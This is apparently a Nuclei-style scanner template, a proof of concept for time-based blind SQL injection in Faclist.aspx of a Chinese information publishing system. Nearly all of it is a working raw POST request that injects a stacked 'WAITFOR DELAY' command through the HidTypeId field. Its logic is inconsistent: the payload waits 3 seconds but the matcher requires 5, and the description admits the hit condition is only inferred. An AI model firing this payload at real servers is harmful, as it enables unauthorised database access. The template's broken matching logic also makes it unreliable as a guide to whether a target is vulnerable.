id: poc-eudog1ln67v0xolb
info:
  name: 中宝信息发布系统Faclist.aspx存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2026
http:
- raw:
  - 'POST /Factory/Faclist.aspx?id=2 HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36

    Content-Type: application/x-www-form-urlencoded


    ToolkitｓｃｒｉｐｔManager1=UpdatePanel2|btnok&ToolkitｓｃｒｉｐｔManager1_HiddenField=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=&__VIEWSTATEGENERATOR=&txtname=&pageno=&HidTypeId=2'';WAITFOR DELAY ''0:0:3'' --&btnok='
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
